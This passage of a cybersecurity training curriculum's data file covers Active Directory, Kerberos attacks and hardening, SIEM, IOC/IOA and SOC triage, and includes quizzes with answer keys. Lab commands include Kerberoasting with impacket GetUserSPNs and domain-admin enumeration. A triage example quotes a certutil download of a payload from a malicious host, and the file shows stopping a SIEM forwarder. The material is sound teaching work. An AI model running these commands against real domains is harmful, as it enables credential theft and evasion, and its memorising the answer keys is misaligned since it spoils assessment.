    relatedConcepts: ['c9_windows_auth_tokens'],
    definition: 'The enterprise directory service providing centralized identity management, authentication (Kerberos/LDAP), Group Policy Objects (GPO), and organizational unit hierarchies.',
    whyItMatters: 'Active Directory manages over 90% of Fortune 500 enterprise identities; compromising AD grants the keys to the entire corporate kingdom.',
    mentalModel: 'A feudal empire: The Forest is the Empire, Domains are Kingdoms within the empire, Domain Controllers are the Royal Castles, and GPOs are royal edicts enforced on every peasant workstation.',
    coreExplanation: 'AD components: Forest (security boundary), Domain (identity boundary, e.g. `corp.local`), Domain Controller (DC - runs NTDS.dit database, KDC, DNS, LDAP), Global Catalog, Organizational Units (OUs), Group Policy Objects (GPOs - configuration push), Trusts (one-way/two-way domain relationships).',
    visualExplanation: {
      type: 'tree',
      title: 'Active Directory Forest Hierarchy',
      content: 'Forest: corp.global\n ├── Domain: us.corp.global (DC: dc01.us.corp.global)\n │    ├── OU: Workstations (Enforced by Workstation GPO)\n │    ├── OU: Servers\n │    └── OU: Domain Admins\n └── Domain: eu.corp.global (Two-way transitive trust)'
    },
    example: 'Querying LDAP with `Get-ADUser -Filter * -Properties Description` frequently discovers service passwords accidentally typed into user description fields.',
    practicalExercise: {
      task: 'Enumerate Active Directory domain objects, trust relationships, and domain admins in the AD Lab.',
      commandOrPayload: 'nltest /dclist:corp.local && net group "Domain Admins" /domain',
      expectedOutcome: 'Identifies active Domain Controllers and all user accounts belonging to the Domain Admins group.',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Assuming a Domain is an absolute security boundary (in multi-domain forests, compromise of one domain can lead to complete Forest root compromise via SID History).',
      'Placing standard users in privileged built-in groups like Account Operators or Backup Operators.'
    ],
    securityRelevance: 'The database file `NTDS.dit` contains password hashes for EVERY user and computer in the enterprise domain; dumping it represents complete domain compromise.',
    offensivePerspective: 'Red teams run BloodHound to map non-obvious ACL attack paths, derivative local admin rights, and unconstrained delegation paths to Domain Admin.',
    defensivePerspective: 'Enterprises implement Tiered Administrative Models (Tier 0: DCs/AD, Tier 1: Servers, Tier 2: Workstations) and deploy Privileged Access Workstations (PAWs).',
    assessment: {
      question: 'What is the absolute top-level security boundary in Active Directory architecture?',
      options: ['Domain', 'Organizational Unit (OU)', 'Active Directory Forest', 'Workgroup'],
      correctIndex: 2,
      explanation: 'The Forest is the ultimate security boundary in Active Directory; administrators in one domain within a forest can potentially compromise the forest root.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Active Directory Admin', 'Penetration Tester', 'Enterprise Security Architect']
  },

  'c10_kerberos_attacks': {
    id: 'c10_kerberos_attacks',
    level: 10,
    title: 'Kerberos Attacks: Kerberoasting, AS-REP Roasting & Golden Tickets',
    difficulty: 'EXPERT',
    prerequisites: ['c10_ad_architecture', 'c9_ntlm_kerberos_basics'],
    nextConcepts: ['c10_ad_hardening_detection', 'c15_redteam_methodology'],
    relatedConcepts: ['c9_ntlm_kerberos_basics'],
    definition: 'Exploiting Kerberos protocol mechanisms: Kerberoasting (requesting TGS tickets for SPN accounts and cracking offline), AS-REP Roasting (requesting TGTs for accounts without pre-authentication), and Golden/Silver Ticket forgery.',
    whyItMatters: 'Kerberoasting requires ZERO administrative privileges—any valid domain user account can extract and crack service account password hashes offline.',
    mentalModel: 'Asking the receptionist for admission tickets to a VIP lounge (TGS encrypted with the lounge owner\'s secret key), then taking the ticket home to your private lab to crack the padlock combination.',
    coreExplanation: '1) Kerberoasting: Query accounts with Service Principal Names (`SPN`), request TGS ticket from DC (Ticket is encrypted with the service account\'s NTLM hash), crack ticket offline with Hashcat. 2) AS-REP Roasting: Target accounts with `DONT_REQ_PREAUTH` flag. 3) Golden Ticket: Forged TGT using the extracted `krbtgt` account NTLM hash (persists for 10 years).',
    visualExplanation: {
      type: 'flow',
      title: 'Kerberoasting Attack Lifecycle',
      content: '[Standard Domain User] -> (Requests TGS for SPN "MSSQLSvc/db01.corp.local") -> [Domain Controller KDC]\n[Domain Controller KDC] -> (Returns TGS ticket encrypted with SQL Service Account NTLM Hash) -> [Attacker]\n[Attacker] -> (Extracts ticket hash with Rubeus/GetUserSPNs -> Cracks offline via Hashcat -m 13100) -> [Plaintext Password: "Password123!"]'
    },
    example: 'Using Impacket: `GetUserSPNs.py corp.local/john:Pass123 -dc-ip 10.10.10.1 -request` dumps crackable Kerberos TGS hashes.',
    practicalExercise: {
      task: 'Execute a Kerberoasting attack and crack the service account ticket in the Active Directory Lab.',
      commandOrPayload: 'impacket-GetUserSPNs corp.local/operator:CyberLab2026! -request -outputfile kerb_hashes.txt',
      expectedOutcome: 'Extracts valid `$krb5tgs$23$...` hash for offline cracking.',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Using short, predictable human passwords for Kerberos service accounts instead of 30+ character random Group Managed Service Accounts (gMSA).',
      'Assuming Kerberoasting generates network alerts on traditional firewalls (it is standard, legitimate Kerberos traffic on port 88).'
    ],
    securityRelevance: 'Service accounts frequently possess local administrator privileges on multiple database and application servers, enabling instant lateral movement upon cracking.',
    offensivePerspective: 'Red teams automate SPN discovery and AS-REP roasting during internal assessments as their primary credential harvesting technique.',
    defensivePerspective: 'Defenders deploy gMSA (which rotate 128-character passwords automatically), set honey-SPN accounts to detect roasting, and monitor Event ID 4769 (RC4 encryption ticket requests).',
    assessment: {
      question: 'Why does Kerberoasting not require administrative privileges to execute within an Active Directory domain?',
      options: [
        'Because Kerberos runs without encryption by default',
        'Because any authenticated domain user is authorized by design to request a service ticket (TGS) for any registered Service Principal Name (SPN)',
        'Because the Domain Controller transmits passwords in cleartext over UDP port 88',
        'Because standard users share the krbtgt private key'
      ],
      correctIndex: 1,
      explanation: 'Active Directory Kerberos architecture allows ANY valid domain user to request a TGS ticket for any valid SPN so they can connect to network services.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Penetration Tester', 'Red Team Operator', 'Active Directory Security Engineer']
  },

  'c10_ad_hardening_detection': {
    id: 'c10_ad_hardening_detection',
    level: 10,
    title: 'Active Directory Hardening, GPO Security & Attack Path Analysis',
    difficulty: 'ADVANCED',
    prerequisites: ['c10_ad_architecture', 'c10_kerberos_attacks'],
    nextConcepts: ['c11_siem_architecture', 'c16_purple_team_loop'],
    relatedConcepts: ['c10_ad_architecture'],
    definition: 'Hardening Active Directory infrastructure: Tiered administrative models, Protected Users security group, Group Managed Service Accounts (gMSA), GPO security filtering, and Microsoft Defender for Identity.',
    whyItMatters: 'Hardening Active Directory eliminates transitive lateral movement paths and forces adversaries to burn expensive zero-day exploits.',
    mentalModel: 'Eliminating the secret tunnels and backdoors connecting the outer castle courtyards directly to the royal throne room.',
    coreExplanation: 'Key AD defenses: 1) Deploy gMSAs for all services. 2) Add privileged accounts to "Protected Users" group (disables NTLM, prevents RC4 Kerberos, eliminates credential caching in LSASS). 3) Implement Tier 0 / Red Forest isolation. 4) Rotate `krbtgt` password twice. 5) Audit Active Directory ACLs using BloodHound / PingCastle.',
    visualExplanation: {
      type: 'diagram',
      title: '3-Tier Active Directory Administrative Isolation Model',
      content: 'Tier 0: Identity & Core Infrastructure [Domain Controllers, PKI, ADFS] (Domain Admins ONLY login here)\n   ▲ (Strict firewall & credential isolation - no credentials flow down)\nTier 1: Enterprise Servers & Applications [SQL, Exchange, Web, File Servers]\n   ▲ (Strict isolation)\nTier 2: User Endpoints & Workstations [Laptops, Printers, Standard Users]'
    },
    example: 'Adding Domain Admins to the "Protected Users" group ensures their credentials are never cached in plaintext or NTLM form when logging into member servers.',
    practicalExercise: {
      task: 'Audit AD security misconfigurations and weak ACL permissions in the AD Lab.',
      commandOrPayload: 'Get-ADGroupMember "Protected Users" && Get-ADDefaultDomainPasswordPolicy',
      expectedOutcome: 'Verifies minimum password length, lockout thresholds, and protected accounts.',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Logging into Tier 2 user workstations with Tier 0 Domain Admin credentials (leaves Domain Admin hashes in workstation LSASS memory).',
      'Leaving LAPS (Local Administrator Password Solution) disabled, resulting in identical local admin passwords across all workstations.'
    ],
    securityRelevance: 'Without LAPS, compromising one workstation gives the attacker the local admin password for EVERY computer on the corporate network.',
    offensivePerspective: 'Attackers search for Tier-jumping violations where Domain Admins leave active sessions on compromised Tier 2 workstations.',
    defensivePerspective: 'Blue teams enforce Windows LAPS, implement Privileged Access Workstations (PAWs), and monitor MDI / Azure ATP alerts for abnormal ticket anomalies.',
    assessment: {
      question: 'What happens when a Windows user account is added to the "Protected Users" security group in Active Directory?',
      options: [
        'The account is permanently locked out',
        'NTLM authentication is disabled, Kerberos ceases caching credentials in LSASS, and weak DES/RC4 ciphers are banned for that user',
        'The user receives full Domain Admin rights automatically',
        'The user is forced to change passwords every 5 minutes'
      ],
      correctIndex: 1,
      explanation: 'The Protected Users group enforces strict security controls: it stops credential caching in LSASS, disables NTLM authentication, and restricts Kerberos to AES encryption.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Active Directory Architect', 'SOC Lead', 'Security Engineer']
  },

  // LEVEL 11: BLUE TEAM, SIEM & SOC OPERATIONS
  'c11_siem_architecture': {
    id: 'c11_siem_architecture',
    level: 11,
    title: 'SIEM Architecture: Log Ingestion, Normalization & Correlation',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c1_pipes_redirection', 'c9_windows_event_forensics'],
    nextConcepts: ['c11_ioc_vs_ioa', 'c11_soc_alert_triage'],
    relatedConcepts: ['c9_windows_event_forensics'],
    definition: 'Security Information and Event Management (SIEM) systems (Splunk, Microsoft Sentinel, Elastic SIEM) aggregating, parsing, normalizing, and correlating security telemetry from across the entire enterprise.',
    whyItMatters: 'A modern enterprise generates millions of raw events per second; SIEM correlation rules transform raw noise into high-fidelity actionable security alerts.',
    mentalModel: 'An air traffic control radar combining data from satellites, airport radars, weather beacons, and flight transponders onto a single screen with collision warning alerts.',
    coreExplanation: 'SIEM pipeline: 1) Log Collection (Syslog, Event Forwarding, Beats/Agents), 2) Parsing & Normalization (mapping fields into standard taxonomies like Elastic Common Schema ECS or Splunk CIM), 3) Indexing & Storage, 4) Correlation Rules (e.g. 5 failed logins followed by 1 success within 60 seconds from external IP -> Alert), 5) Dashboarding & Alerting.',
    visualExplanation: {
      type: 'flow',
      title: 'Enterprise SIEM Log Ingestion & Correlation Pipeline',
      content: '[Endpoints (Sysmon)] ──┐\n[Firewalls / NetFlow] ──┼─> [Log Forwarder / Kafka] -> [SIEM Parser / ECS Normalizer] -> [Correlation Engine] -> [SOC Alert Generated]\n[Cloud Audit Logs]   ──┘'
    },
    example: 'Writing a Splunk SPL query: `index=security EventCode=4625 | stats count by TargetUserName, Source_Network_Address | where count > 20` detects active brute-force attempts.',
    practicalExercise: {
      task: 'Query and correlate security log events in the SOC SIEM Lab.',
      commandOrPayload: 'search index=windows (EventCode=4625 OR EventCode=4624) | transaction TargetUserName maxspan=5m',
      expectedOutcome: 'Identifies brute-force credential stuffing leading to successful logon.',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Ingesting all logs without filtering or normalization, blowing through storage licenses with low-value debug noise.',
      'Relying purely on single-event triggers rather than stateful multi-source correlation.'
    ],
    securityRelevance: 'Attackers dwell undetected for an average of 16-200 days when organizations lack comprehensive SIEM log coverage and correlation.',
    offensivePerspective: 'Adversaries modify logging configurations, blind SIEM forwarders (`sc stop SplunkForwarder`), or flood logs to create alert fatigue.',
    defensivePerspective: 'SOC engineers continuously tune detection rules, track Mean Time to Detect (MTTD), and build automated SOAR playbooks.',
    assessment: {
      question: 'What is the purpose of log normalization in a modern SIEM platform?',
      options: [
        'To delete all logs older than 24 hours',
        'To translate disparate log field names (e.g. src_ip, SourceAddress, client_ip) into a unified standard schema (e.g. source.ip) for universal querying',
        'To encrypt logs so analysts cannot read them',
        'To increase the file size of log archives'
      ],
      correctIndex: 1,
      explanation: 'Normalization maps fields from different vendors (Windows, Cisco, AWS, Linux) into a common schema so a single correlation query works across all technologies.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['SOC Analyst', 'SIEM Engineer', 'Detection Engineer']
  },

  'c11_ioc_vs_ioa': {
    id: 'c11_ioc_vs_ioa',
    level: 11,
    title: 'Indicators of Compromise (IOC) vs Indicators of Attack (IOA)',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c11_siem_architecture'],
    nextConcepts: ['c11_soc_alert_triage', 'c12_hypothesis_hunting'],
    relatedConcepts: ['c11_siem_architecture'],
    definition: 'Distinguishing reactive forensic evidence of past compromise (IOCs: file hashes, IP addresses, domains) from proactive behavioral patterns of active adversary intent (IOAs: execution behavior, privilege escalation attempts).',
    whyItMatters: 'David Bianco\'s Pyramid of Pain demonstrates that blocking IOCs (hashes/IPs) is trivial for attackers to bypass, while detecting IOAs (TTPs) causes maximum adversary disruption.',
    mentalModel: 'IOC = Finding broken glass and muddy footprints on the living room floor the next morning; IOA = The motion sensor alarming while someone is actively picking the front door lock.',
    coreExplanation: 'Pyramid of Pain (from bottom to top): 1) Hash values (Trivial for attacker to change), 2) IP addresses (Easy to proxy), 3) Domain names (Simple via fast-flux), 4) Network/Host artifacts (Annoying to modify), 5) Tools (Challenging to rewrite), 6) Tactics, Techniques & Procedures / TTPs (Tough to change).',
    visualExplanation: {
      type: 'diagram',
      title: 'David Bianco\'s Pyramid of Pain',
      content: '                ▲  [TTPs / IOAs]  (TOUGH for attacker to change)\n               / \\  [Tools]\n              /   \\  [Network/Host Artifacts]\n             /     \\  [Domain Names]\n            /       \\  [IP Addresses]\n           /_________\\  [Hash Values]   (TRIVIAL for attacker to change)'
    },
    example: 'An IOC is blocking SHA-256 `e3b0c44...`; an IOA is alerting whenever `cmd.exe` spawns `powershell.exe` with base64 encoded arguments from inside `w3wp.exe` (web server).',
    practicalExercise: {
      task: 'Map an observed alert to MITRE ATT&CK TTPs and evaluate Pyramid of Pain resilience in the SOC Lab.',
      commandOrPayload: 'echo "T1059.001 - PowerShell Execution with EncodedCommand -> IOA Behavioral Detection"',
      expectedOutcome: 'Categorizes detection as resilient behavioral IOA rather than fragile hash IOC.',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Assuming that because a malware sample has a new file hash, existing behavioral endpoint detections will fail.',
      'Spending 90% of detection engineering budget subscribing to static IP blocklists.'
    ],
    securityRelevance: 'Modern EDR and Next-Gen SIEMs focus detection engineering on behavioral IOAs to catch zero-day attacks with zero known signatures.',
    offensivePerspective: 'Adversaries recompile binaries (changing 1 byte changes the entire SHA-256 hash) to trivially bypass static antivirus signature checks.',
    defensivePerspective: 'Detection engineers build Sigma and YARA rules targeting execution anomalies (e.g. Word spawning PowerShell) that remain constant regardless of hash changes.',
    assessment: {
      question: 'According to the Pyramid of Pain, which type of indicator causes the greatest disruption to an adversary when detected and neutralized?',
      options: ['MD5 Hash Values', 'IP Addresses', 'Domain Names', 'Tactics, Techniques & Procedures (TTPs / IOAs)'],
      correctIndex: 3,
      explanation: 'TTPs sit at the peak of the Pyramid of Pain; forcing an attacker to change their fundamental operational behaviors and methodologies requires significant time and retraining.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['SOC Analyst', 'Threat Hunter', 'Detection Engineer', 'Threat Intel Analyst']
  },

  'c11_soc_alert_triage': {
    id: 'c11_soc_alert_triage',
    level: 11,
    title: 'SOC Alert Triage, True/False Positives & Incident Containment',
    difficulty: 'ADVANCED',
    prerequisites: ['c11_ioc_vs_ioa', 'c9_windows_event_forensics'],
    nextConcepts: ['c12_hypothesis_hunting', 'c13_chain_of_custody'],
    relatedConcepts: ['c11_ioc_vs_ioa'],
    definition: 'The operational process of analyzing security alerts, validating True Positives vs False Positives, determining scope, containing compromised hosts, and escalating via standard Incident Response frameworks.',
    whyItMatters: 'Alert fatigue causes real compromises to go unnoticed; rapid, methodical triage minimizes adversary dwell time and prevents enterprise-wide ransomware encryption.',
    mentalModel: 'An emergency room trauma doctor: Rapidly triage incoming patient (alert) -> Check vital signs (validate telemetry) -> Determine injury severity (impact) -> Stop the bleeding immediately (network isolation) -> Transfer to surgery (deep forensics).',
    coreExplanation: 'Triage lifecycle: 1) Initial Review (Alert source, timestamp, host, user), 2) Context Enrichment (VirusTotal, IP reputation, user role, baseline behavior), 3) Classification (True Positive Benign, True Positive Malicious, False Positive), 4) Containment (Host network isolation, account disablement, session revocation), 5) Escalation to Tier 2/IR.',
    visualExplanation: {
      type: 'flow',
      title: 'SOC Alert Triage Decision Flowchart',
      content: '[Incoming SIEM Alert]\n        ↓\n[Enrichment & Context Analysis (VirusTotal, Sysmon Process Tree, User Baseline)]\n        ↓\n   Is it Malicious?\n   ├── NO  -> [False Positive] -> (Tune Detection Rule / Close Ticket)\n   └── YES -> [True Positive Malicious] -> [IMMEDIATE CONTAINMENT: Isolate Host, Revoke Tokens] -> [Escalate to IR]'
    },
    example: 'An alert fires for `certutil.exe -urlcache -split -f http://malicious.site/payload.exe`. Triage confirms parent process is `cmd.exe` spawned by Word macro -> True Positive Malicious -> Isolate host immediately.',
    practicalExercise: {
      task: 'Triage a live SOC alert queue, classify True vs False positives, and execute host containment in the SOC Lab.',
      commandOrPayload: 'isolate-host --target 10.10.10.45 --reason "Active Ransomware Stager Detected"',
      expectedOutcome: 'Isolates endpoint from enterprise network while maintaining EDR telemetry stream.',
      labRoute: '/soc-lab'
    },
    commonMistakes: [
      'Rebooting or wiping a compromised machine immediately before capturing volatile RAM memory forensics.',
      'Closing an alert as a False Positive without verifying the parent process context.'
    ],
    securityRelevance: 'Rapid containment within the "Golden Hour" of an intrusion prevents attackers from completing lateral movement and exfiltrating data.',
    offensivePerspective: 'Adversaries blend into living-off-the-land system utilities (PowerShell, certutil, wmic) specifically to look like administrative False Positives.',
    defensivePerspective: 'SOC analysts use SOAR playbooks (Security Orchestration, Automation, and Response) to automate containment actions (e.g. blocking firewall IPs) within seconds.',
    assessment: {
      question: 'What is the immediate primary containment action when a SOC analyst verifies an active ransomware stager running on a corporate workstation?',
      options: [
        'Delete the user account from Active Directory permanently',
        'Isolate the endpoint from the network via EDR while keeping power ON to preserve volatile memory evidence',
        'Send an email to all company employees',
        'Format the hard drive immediately'
      ],
      correctIndex: 1,
      explanation: 'Network isolation stops ransomware spread and C2 communication, while keeping the machine powered on preserves critical volatile RAM forensics and encryption keys.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['SOC Analyst', 'Incident Responder', 'SOC Lead']
  }
};
